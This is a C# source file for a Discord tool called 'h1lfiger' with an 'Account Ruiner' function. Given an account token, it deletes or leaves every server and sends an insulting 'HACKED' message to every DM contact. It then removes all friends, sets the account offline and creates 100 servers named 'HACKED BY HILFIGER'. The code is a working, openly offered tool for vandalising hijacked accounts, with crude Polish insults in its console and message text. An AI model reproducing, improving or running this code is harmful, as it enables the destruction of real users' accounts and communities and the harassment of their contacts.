using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Gateway;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Drawing;
using System.Resources;
using System.Net.Http;
using System.Net;
using System.Runtime.InteropServices;

namespace h1lfiger
{
    class Program
    {
        const string hilfiger = "hilf1ger @dup4slon1a:~$ ./j4npw3l - ";
        const string sound = "guwno.wav";
        static DiscordSocketClient client = new DiscordSocketClient();
        static WebClient http = new WebClient();

        static System.Media.SoundPlayer player = new System.Media.SoundPlayer();

        static void Login(string token)
        {
            try
            {
                client.Login(token);
                ulong id = client.User.Id;
                Console.WriteLine(hilfiger + "Logged in successfully!" +
                    "\n" +
                    hilfiger + "Account info" +
                    "\n" +
                    hilfiger + "Username: " + client.GetUser(id).Username +
                    "\n" +
                    hilfiger + "Created At: " + client.GetUser(id).CreatedAt +
                    "\n" +
                    hilfiger + "Badges: " + client.GetUser(id).Badges +
                    "\n" +
                    hilfiger + "Hypesquad: " + client.GetUser(id).Hypesquad +
                    "\n" +
                    hilfiger + "ID: " + client.GetUser(id).Id +
                    "\n" +
                    hilfiger + "WE ARE ANONYNIUS WE ARE THE LEGION"); Thread.Sleep(500);

            }
            catch
            {
                Console.WriteLine(hilfiger + "Please check if your token is valid");
            }
        }

        static void AccountRuiner()
        {
            Console.Clear();
            ulong id = client.User.Id;

            foreach (var guild in client.GetGuilds())
            {
                if (guild.Owner)
                    guild.Delete();
                else
                    guild.Leave();

                Console.WriteLine(hilfiger + client.GetUser(id).Username + " left the server ID: " + guild.Id.ToString() + " \n");
            }

            foreach (var dm in client.GetPrivateChannels())
            {
                EmbedMaker embed = new EmbedMaker();
                embed.Title = hilfiger + "HAKED KURWA ROBALE DZIWKO TO HILFIGER A NIE TOMASZ HAJTO AXAXA";
                embed.Description = ":sunglasses:";
                embed.ImageUrl = "https://media.discordapp.net/attachments/729323613877960724/735555010691072101/unknown.png";

                dm.SendMessage(hilfiger + "pw3d by hilf1ger 5quad saxax: " + client.GetUser(id).Username + " axaxaxax", false, embed); Thread.Sleep(100);

                Console.WriteLine(hilfiger + client.GetUser(id).Username + " sent the chat message" + " \n");

            }

            foreach (var relationship in client.GetRelationships()) // :flushed: :point_right: :point_left:
            {
                relationship.Remove();

                Console.WriteLine(hilfiger + client.GetUser(id).Username + " successfully removed the : " + relationship.User + " relationship \n");
            }
                
            client.SetStatus(UserStatus.Offline);

            Console.WriteLine(hilfiger + "Account user status set to: offline \n");

            http.DownloadFile("https://media.discordapp.net/attachments/729323613877960724/735555010691072101/unknown.png", "image.png");


            for (int i = 1; i <= 100; i++) 
            {
                client.CreateGuild("$$$HACKED BY HILFIGER$$$", Image.FromFile("image.png"), "russia");

                Console.WriteLine(hilfiger + client.GetUser(id).Username + " created the server, name: $$$HACKED BY HILFIGER$$$, region: russia" + " \n");
            }

            Console.WriteLine(hilfiger + "HOLZED \n");
        }

        static void Main(string[] args)
        {
            Console.Title = "$ h1lfiger5qu4d";

            http.DownloadFile("https://cdn.discordapp.com/attachments/729323613877960724/741026268673474580/wav.wav", sound);
            player.SoundLocation = sound;
            player.Load();
            player.PlaySync();

        main_menu:
            Console.Clear();

            Console.WriteLine("HILF1GER \n" +
                "1. Log in via token \n" +
                "2. Exit \n" +
                hilfiger);

            switch (Console.ReadLine())
            {
                case "1":
                    Console.Clear();
                    Console.WriteLine(hilfiger + "Enter a token: ");
                    Login(Console.ReadLine());
                    muj:
                    Console.WriteLine(hilfiger + "Select \n" +
                        "1. Account Ruiner \n");
                    switch(Console.ReadLine())
                    {
                        case "1":
                            AccountRuiner();
                            goto muj;
                        default:
                            Console.WriteLine(hilfiger + "please select an actual option \n"); Thread.Sleep(1000);
                            Console.Clear();
                            break;
                    }
                    break;
                case "2":
                    Environment.Exit(0);
                    break;
                default:
                    Console.Clear();
                    Console.WriteLine(hilfiger + "please select an actual option"); Thread.Sleep(1000);
                    goto main_menu;
            }

            Console.ReadKey();
        }
    }
}
